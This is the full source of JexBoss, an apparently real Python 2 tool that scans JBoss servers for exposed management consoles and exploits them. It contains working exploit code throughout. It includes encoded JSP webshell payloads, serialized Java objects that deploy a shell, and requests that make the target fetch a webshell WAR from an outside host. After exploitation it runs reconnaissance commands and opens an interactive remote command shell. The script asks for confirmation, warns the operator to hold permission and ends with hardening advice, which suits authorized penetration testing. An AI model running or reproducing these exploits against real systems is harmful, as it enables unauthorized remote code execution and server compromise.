# coding: utf-8
# JexBoss v1.0. @autor: João Filho Matos Figueiredo (joaomatosf@gmail.com)
# Updates: https://github.com/joaomatosf/jexboss
# Free for distribution and modification, but the authorship should be preserved.


import httplib, sys, urllib, os, time
from urllib import urlencode

RED = '\x1b[91m'
RED1 = '\033[31m'
BLUE = '\033[94m'
GREEN = '\033[32m'
BOLD = '\033[1m'
NORMAL = '\033[0m'
ENDC = '\033[0m'

def getHost(url):
	tokens = url.split("://")
	if len(tokens) == 2: #foi fornecido protocolo
		return tokens[1].split(":")[0]
	else:
		return tokens.split(":")[0]

def getProtocol(url):
	tokens = url.split("://")
	if tokens[0] == "https":
		return "https"
	else:
		return "http"

def getPort(url):
	token = url[6:].split(":")
	if len(token) == 2:
		return token[1]
	elif getProtocol(url) == "https":
		return 443
	else:
		return 80

def getConnection(url):
	if getProtocol(url) == "https":
		return httplib.HTTPSConnection(getHost(url), getPort(url))
	else:
		return httplib.HTTPConnection(getHost(url), getPort(url))


def getSuccessfully(url, path):
		result = 404
		time.sleep(5)
		conn = getConnection(url)
		conn.request("GET", path)
		result = conn.getresponse().status
		if result == 404:
			conn.close()
			time.sleep(7)
			conn = getConnection(url)
			conn.request("GET", path)
			result = conn.getresponse().status
			conn.close()
		return result

def checkVul(url):

	print ( GREEN +" ** Checking Host: %s **\n" %url )

	path = { "jmx-console"		 : "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
			 "web-console" 		 : "/web-console/ServerInfo.jsp",
			 "JMXInvokerServlet" : "/invoker/JMXInvokerServlet"}

	for i in path.keys():
		try:
			print GREEN + " * Checking %s: \t" %i + ENDC,
			conn = getConnection(url)
			conn.request("HEAD", path[i])
			path[i] = conn.getresponse().status
			if path[i] == 200 or path[i] == 500:
				print RED + "[ VULNERABLE ]" + ENDC
			else: print GREEN + "[ OK ]"
			conn.close()
		except:
			print RED + "\n * An error ocurred while contaction the host %s\n" %url + ENDC
			path[i] = 505

	return path

def autoExploit(url, type):

	# exploitJmxConsoleFileRepository: tested and working in jboss 4 and 5
	# exploitJmxConsoleMainDeploy:	   tested and working in jboss 4 and 6
	# exploitWebConsoleInvoker:		   tested and working in jboss 4
	# exploitJMXInvokerFileRepository: tested and working in jboss 4 and 5

	print GREEN + ("\n * Sending exploit code to %s. Wait...\n" %url)
	result = 505
	if type == "jmx-console":
		result = exploitJmxConsoleFileRepository(url)
		if result != 200 and result != 500:
			result = exploitJmxConsoleMainDeploy(url)
	elif type == "web-console":
		result = exploitWebConsoleInvoker(url)
	elif type == "JMXInvokerServlet":
		result = exploitJMXInvokerFileRepository(url)

	if result == 200 or result == 500:
		print GREEN + " * Successfully deployed code! Starting command shell, wait...\n" + ENDC
		shell_http(url, type)
	else:
		print (RED + "\n * Could not exploit the flaw automatically. Exploitation requires manual analysis...\n"
				    "   Waiting for 7 seconds...\n "+ ENDC)
		time.sleep(7)

def shell_http(url, type):
	if type == "jmx-console" or type == "web-console":
		path = '/jbossass/jbossass.jsp?'
	elif type == "JMXInvokerServlet":
		path = '/shellinvoker/shellinvoker.jsp?'

	conn = getConnection(url)
	conn.request("GET", path)
	conn.close()
	time.sleep(7)
	resp = ""
	#clear()
	print " * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - * \n"
	print RED+" * "+url+": \n"+ENDC
	headers = {"User-Agent" : "jexboss"}
	for cmd in ['uname -a', 'cat /etc/issue', 'id']:
		conn = getConnection(url)
		cmd = urlencode({"ppp": cmd})
		conn.request("GET", path+cmd, '', headers)
		resp += " "+conn.getresponse().read().split(">")[1]
	print resp,

	while 1:
		print BLUE + "[Type commands or \"exit\" to finish]"
		cmd=raw_input("Shell> "+ENDC)
		#print ENDC
		if cmd == "exit":
			break
		conn = getConnection(url)
		cmd = urlencode({"ppp": cmd})
		conn.request("GET", path+cmd, '', headers)
		resp = conn.getresponse()
		if resp.status == 404:
			print RED+ " * Error contacting the commando shell. Try again later..."
			conn.close()
			continue
		stdout = ""
		try:
			stdout = resp.read().split("pre>")[1]
		except:
			print RED+ " * Error contacting the commando shell. Try again later..."
		if stdout.count("An exception occurred processing JSP page") == 1:
			print RED + " * Error executing command \"%s\". " %cmd.split("=")[1] + ENDC
		else: print stdout,
		conn.close()

def exploitJmxConsoleMainDeploy(url):
	# MainDeployer
	# does not work in jboss5 (bug in jboss5)
	# shell in link
	# /jmx-console/HtmlAdaptor
	jsp = "http://www.joaomatosf.com/rnp/jbossass.war"
	payload =(  "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service"
				"=MainDeployer&methodIndex=19&arg0="+jsp)
	print ( GREEN+ "\n * Info: This exploit will force the server to deploy the webshell "
			       "\n   available on: "+jsp +ENDC)
	conn = getConnection(url)
	conn.request("HEAD", payload)
	result = conn.getresponse().status
	conn.close()
	return getSuccessfully(url, "/jbossass/jbossass.jsp")

def exploitJmxConsoleFileRepository(url):
		# DeploymentFileRepository
		# tested and work in jboss4, 5.
		# doest not work in jboss6
		# shell jsp
		# /jmx-console/HtmlAdaptor
		jsp =("%3C%25%40%20%70%61%67%65%20%69%6D%70%6F%72%74%3D%22%6A%61%76%61"
			  "%2E%75%74%69%6C%2E%2A%2C%6A%61%76%61%2E%69%6F%2E%2A%22%25%3E%3C"
			  "%70%72%65%3E%3C%25%20%69%66%20%28%72%65%71%75%65%73%74%2E%67%65"
			  "%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29%20%21%3D%20"
			  "%6E%75%6C%6C%20%26%26%20%72%65%71%75%65%73%74%2E%67%65%74%48%65"
			  "%61%64%65%72%28%22%75%73%65%72%2D%61%67%65%6E%74%22%29%2E%65%71"
			  "%75%61%6C%73%28%22%6A%65%78%62%6F%73%73%22%29%29%20%7B%20%50%72"
			  "%6F%63%65%73%73%20%70%20%3D%20%52%75%6E%74%69%6D%65%2E%67%65%74"
			  "%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%72%65%71%75%65%73"
			  "%74%2E%67%65%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29"
			  "%29%3B%20%44%61%74%61%49%6E%70%75%74%53%74%72%65%61%6D%20%64%69"
			  "%73%20%3D%20%6E%65%77%20%44%61%74%61%49%6E%70%75%74%53%74%72%65"
			  "%61%6D%28%70%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29"
			  "%29%3B%20%53%74%72%69%6E%67%20%64%69%73%72%20%3D%20%64%69%73%2E"
			  "%72%65%61%64%4C%69%6E%65%28%29%3B%20%77%68%69%6C%65%20%28%20%64"
			  "%69%73%72%20%21%3D%20%6E%75%6C%6C%20%29%20%7B%20%6F%75%74%2E%70"
			  "%72%69%6E%74%6C%6E%28%64%69%73%72%29%3B%20%64%69%73%72%20%3D%20"
			  "%64%69%73%2E%72%65%61%64%4C%69%6E%65%28%29%3B%20%7D%20%7D%25%3E" )

		payload =("/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service="
		           "DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0="
		           "jbossass.war&argType=java.lang.String&arg1=jbossass&argType=java.lang.St"
		           "ring&arg2=.jsp&argType=java.lang.String&arg3="+jsp+"&argType=boolean&arg4=True")

		conn = getConnection(url)
		conn.request("HEAD", payload)
		result = conn.getresponse().status
		conn.close()
		return getSuccessfully(url, "/jbossass/jbossass.jsp")

def exploitJMXInvokerFileRepository(url):
	# tested and work in jboss4, 5
	# MainDeploy, shell in data
	# /invoker/JMXInvokerServlet
	payload = ( "\xac\xed\x00\x05\x73\x72\x00\x29\x6f\x72\x67\x2e\x6a\x62\x6f\x73"
				"\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d\x61\x72"
				"\x73\x68\x61\x6c\x6c\x65\x64\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f"
				"\x6e\xf6\x06\x95\x27\x41\x3e\xa4\xbe\x0c\x00\x00\x78\x70\x70\x77"
				"\x08\x78\x94\x98\x47\xc1\xd0\x53\x87\x73\x72\x00\x11\x6a\x61\x76"
				"\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72\x12\xe2"
				"\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75"
				"\x65\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e"
				"\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00"
				"\x78\x70\xe3\x2c\x60\xe6\x73\x72\x00\x24\x6f\x72\x67\x2e\x6a\x62"
				"\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d"
				"\x61\x72\x73\x68\x61\x6c\x6c\x65\x64\x56\x61\x6c\x75\x65\xea\xcc"
				"\xe0\xd1\xf4\x4a\xd0\x99\x0c\x00\x00\x78\x70\x7a\x00\x00\x02\xc6"
				"\x00\x00\x02\xbe\xac\xed\x00\x05\x75\x72\x00\x13\x5b\x4c\x6a\x61"
				"\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90"
				"\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x04"
				"\x73\x72\x00\x1b\x6a\x61\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65"
				"\x6d\x65\x6e\x74\x2e\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x0f"
				"\x03\xa7\x1b\xeb\x6d\x15\xcf\x03\x00\x00\x78\x70\x74\x00\x2c\x6a"
				"\x62\x6f\x73\x73\x2e\x61\x64\x6d\x69\x6e\x3a\x73\x65\x72\x76\x69"
				"\x63\x65\x3d\x44\x65\x70\x6c\x6f\x79\x6d\x65\x6e\x74\x46\x69\x6c"
				"\x65\x52\x65\x70\x6f\x73\x69\x74\x6f\x72\x79\x78\x74\x00\x05\x73"
				"\x74\x6f\x72\x65\x75\x71\x00\x7e\x00\x00\x00\x00\x00\x05\x74\x00"
				"\x10\x73\x68\x65\x6c\x6c\x69\x6e\x76\x6f\x6b\x65\x72\x2e\x77\x61"
				"\x72\x74\x00\x0c\x73\x68\x65\x6c\x6c\x69\x6e\x76\x6f\x6b\x65\x72"
				"\x74\x00\x04\x2e\x6a\x73\x70\x74\x01\x79\x3c\x25\x40\x20\x70\x61"
				"\x67\x65\x20\x69\x6d\x70\x6f\x72\x74\x3d\x22\x6a\x61\x76\x61\x2e"
				"\x75\x74\x69\x6c\x2e\x2a\x2c\x6a\x61\x76\x61\x2e\x69\x6f\x2e\x2a"
				"\x22\x25\x3e\x3c\x70\x72\x65\x3e\x3c\x25\x69\x66\x28\x72\x65\x71"
				"\x75\x65\x73\x74\x2e\x67\x65\x74\x50\x61\x72\x61\x6d\x65\x74\x65"
				"\x72\x28\x22\x70\x70\x70\x22\x29\x20\x21\x3d\x20\x6e\x75\x6c\x6c"
				"\x20\x26\x26\x20\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74\x48"
				"\x65\x61\x64\x65\x72\x28\x22\x75\x73\x65\x72\x2d\x61\x67\x65\x6e"
				"\x74\x22\x29\x2e\x65\x71\x75\x61\x6c\x73\x28\x22\x6a\x65\x78\x62"
				"\x6f\x73\x73\x22\x29\x20\x29\x20\x7b\x20\x50\x72\x6f\x63\x65\x73"
				"\x73\x20\x70\x20\x3d\x20\x52\x75\x6e\x74\x69\x6d\x65\x2e\x67\x65"
				"\x74\x52\x75\x6e\x74\x69\x6d\x65\x28\x29\x2e\x65\x78\x65\x63\x28"
				"\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74\x50\x61\x72\x61\x6d"
				"\x65\x74\x65\x72\x28\x22\x70\x70\x70\x22\x29\x29\x3b\x20\x44\x61"
				"\x74\x61\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x20\x64\x69"
				"\x73\x20\x3d\x20\x6e\x65\x77\x20\x44\x61\x74\x61\x49\x6e\x70\x75"
				"\x74\x53\x74\x72\x65\x61\x6d\x28\x70\x2e\x67\x65\x74\x49\x6e\x70"
				"\x75\x74\x53\x74\x72\x65\x61\x6d\x28\x29\x29\x3b\x20\x53\x74\x72"
				"\x69\x6e\x67\x20\x64\x69\x73\x72\x20\x3d\x20\x64\x69\x73\x2e\x72"
				"\x65\x61\x64\x4c\x69\x6e\x65\x28\x29\x3b\x20\x77\x68\x69\x6c\x65"
				"\x20\x28\x20\x64\x69\x73\x72\x20\x21\x3d\x20\x6e\x75\x6c\x6c\x20"
				"\x29\x20\x7b\x20\x6f\x75\x74\x2e\x70\x72\x69\x6e\x74\x6c\x6e\x28"
				"\x64\x69\x73\x72\x29\x3b\x20\x64\x69\x73\x72\x20\x3d\x20\x64\x69"
				"\x73\x2e\x72\x65\x61\x64\x4c\x69\x6e\x65\x28\x29\x3b\x20\x7d\x20"
				"\x7d\x25\x3e\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67"
				"\x2e\x42\x6f\x6f\x6c\x65\x61\x6e\xcd\x20\x72\x80\xd5\x9c\xfa\xee"
				"\x02\x00\x01\x5a\x00\x05\x76\x61\x6c\x75\x65\x78\x70\x01\x75\x72"
				"\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74"
				"\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00"
				"\x78\x70\x00\x00\x00\x05\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61"
				"\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x71\x00\x7e\x00\x0f\x71\x00"
				"\x7e\x00\x0f\x71\x00\x7e\x00\x0f\x74\x00\x07\x62\x6f\x6f\x6c\x65"
				"\x61\x6e\x63\x79\xb8\x87\x78\x77\x08\x00\x00\x00\x00\x00\x00\x00"
				"\x01\x73\x72\x00\x22\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e\x69"
				"\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x49\x6e\x76\x6f\x63\x61"
				"\x74\x69\x6f\x6e\x4b\x65\x79\xb8\xfb\x72\x84\xd7\x93\x85\xf9\x02"
				"\x00\x01\x49\x00\x07\x6f\x72\x64\x69\x6e\x61\x6c\x78\x70\x00\x00"
				"\x00\x04\x70\x78")
	conn = getConnection(url)
	headers = { "Content-Type" : "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
				"Accept"  : "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2"}
	conn.request("POST", "/invoker/JMXInvokerServlet", payload, headers)
	response = conn.getresponse()
	result = response.status
	if result == 401:
		print "   Retrying..."
		conn.close()
		conn.request("HEAD", "/invoker/JMXInvokerServlet", payload, headers)
		response = conn.getresponse()
		result = response.status
	if response.read().count("Failed") > 0:
		result = 505
	conn.close
	return getSuccessfully(url, "/shellinvoker/shellinvoker.jsp")

def exploitWebConsoleInvoker(url):
	# does not work in jboss5 (bug in jboss5)
	# MainDeploy, shell in link
	# /web-console/Invoker
	#jsp = "http://www.joaomatosf.com/rnp/jbossass.war"
	#jsp = "\\x".join("{:02x}".format(ord(c)) for c in jsp)
	#jsp = "\\x" + jsp
	payload = ( "\xac\xed\x00\x05\x73\x72\x00\x2e\x6f\x72\x67\x2e"
				"\x6a\x62\x6f\x73\x73\x2e\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x72\x65"
				"\x6d\x6f\x74\x65\x2e\x52\x65\x6d\x6f\x74\x65\x4d\x42\x65\x61\x6e"
				"\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\xe0\x4f\xa3\x7a\x74\xae"
				"\x8d\xfa\x02\x00\x04\x4c\x00\x0a\x61\x63\x74\x69\x6f\x6e\x4e\x61"
				"\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f"
				"\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x06\x70\x61\x72\x61\x6d\x73"
				"\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f"
				"\x62\x6a\x65\x63\x74\x3b\x5b\x00\x09\x73\x69\x67\x6e\x61\x74\x75"
				"\x72\x65\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67"
				"\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x10\x74\x61\x72\x67\x65"
				"\x74\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x74\x00\x1d\x4c\x6a"
				"\x61\x76\x61\x78\x2f\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2f"
				"\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x3b\x78\x70\x74\x00\x06"
				"\x64\x65\x70\x6c\x6f\x79\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61"
				"\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58"
				"\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74\x00"
				"\x2a"
				#link
				"\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x6a\x6f\x61\x6f\x6d\x61"
				"\x74\x6f\x73\x66\x2e\x63\x6f\x6d\x2f\x72\x6e\x70\x2f\x6a\x62\x6f"
				"\x73\x73\x61\x73\x73\x2e\x77\x61\x72"
				#end
				"\x75\x72\x00\x13\x5b"
				"\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e"
				"\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x00"
				"\x00\x00\x01\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e"
				"\x53\x74\x72\x69\x6e\x67\x73\x72\x00\x1b\x6a\x61\x76\x61\x78\x2e"
				"\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x4f\x62\x6a\x65\x63"
				"\x74\x4e\x61\x6d\x65\x0f\x03\xa7\x1b\xeb\x6d\x15\xcf\x03\x00\x00"
				"\x78\x70\x74\x00\x21\x6a\x62\x6f\x73\x73\x2e\x73\x79\x73\x74\x65"
				"\x6d\x3a\x73\x65\x72\x76\x69\x63\x65\x3d\x4d\x61\x69\x6e\x44\x65"
				"\x70\x6c\x6f\x79\x65\x72\x78")
	conn = getConnection(url)
	headers = { "Content-Type" : "application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation",
				"Accept"  : "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2"}
	conn.request("POST", "/web-console/Invoker", payload, headers)
	response = conn.getresponse()
	result = response.status
	if result == 401:
		print "   Retrying..."
		conn.close()
		conn.request("HEAD", "/web-console/Invoker", payload, headers)
		response = conn.getresponse()
		result = response.status
	conn.close
	return getSuccessfully(url, "/jbossass/jbossass.jsp")


def clear():
	if os.name == 'posix':
		os.system('clear')
	elif os.name == ('ce', 'nt', 'dos'):
		os.system('cls')

def checkArgs(args):
	if len(args) < 2 or args[1].count('.') < 1:
		return 1,"You must provide the host name or IP address you want to test."
	elif len(args[1].split('://')) == 1:
		return 2, 'Changing address "%s" to "http://%s"' %(args[1], args[1])
	elif args[1].count('http') == 1 and args[1].count('.') > 1:
		return 0, ""
	else:
		return 1, 'Parâmetro inválido'

def banner():
	clear()
	print (RED1+"\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\n"
  	          " |                                                      |\n"
              " | @author:  João Filho Matos Figueiredo                |\n"
              " | @contact: joaomatosf@gmail.com                       |\n"
	          " |                                                      |\n"
	          " | @update: https://github.com/joaomatosf/jexboss       |\n"
              " #______________________________________________________#\n\n" )

banner()
# check python version
if sys.version_info[0] == 3:
	print (RED + "\n * Not compatible with version 3 of python.\n"
				  "   Please run it with version 2.7 or lower.\n\n"
			+BLUE+" * Example:\n"
				  "   python2.7 " + sys.argv[0]+ " https://site.com\n\n"+ENDC )
	sys.exit(1)

# check Args
status, message = checkArgs(sys.argv)
if status == 0:
	url = sys.argv[1]
elif status == 1:
	print RED + "\n * Error: %s" %message
	print BLUE + "\n Example:\n python %s https://site.com.br\n" %sys.argv[0] + ENDC
	sys.exit(status)
elif status == 2:
	url = ''.join(['http://',sys.argv[1]])

# check vulnerabilities
mapResult = checkVul(url)

# performs exploitation
for i in ["jmx-console", "web-console", "JMXInvokerServlet"]:
	if mapResult[i] == 200 or mapResult[i] == 500:
		print BLUE + ("\n\n * Do you want to try to run an automated exploitation via \""+BOLD+i+NORMAL+"\" ?\n"
			   	      "   This operation will provide a simple command shell to execute commands on the server..\n"
			   	 +RED+"   Continue only if you have permission!" +ENDC)
		if raw_input("   yes/NO ? ").lower() == "yes":
			autoExploit(url, i)

# resume results
if mapResult.values().count(200) > 0:
	banner()
	print RED+ " Results: potentially compromised server!" +ENDC
	print (GREEN+" * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n\n"
			  " Recommendations: \n"
			  " - Remove web consoles and services that are not used, eg:\n"
			  "    $ rm web-console.war\n"
			  "    $ rm http-invoker.sar\n"
			  "    $ rm jmx-console.war\n"
			  "    $ rm jmx-invoker-adaptor-server.sar\n"
			  "    $ rm admin-console.war\n"
			  " - Use a reverse proxy (eg. nginx, apache, f5)\n"
			  " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\n"
			  " - Search vestiges of exploitation within the directories \"deploy\" or \"management\".\n\n"
			  " References:\n"
			  "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
			  "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
			  "\n"
			  " - If possible, discard this server!\n\n"
			  " * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n" )
elif mapResult.values().count(505) == 0:
	print ( GREEN+ "\n\n * Results: \n"
			"   The server is not vulnerable to bugs tested ... :D\n\n" + ENDC)

# infos
print (ENDC+" * Info: review, suggestions, updates, etc: \n"
			 "   https://github.com/joaomatosf/jexboss\n"
			 "   joaomatosf@gmail.com\n")

print ENDC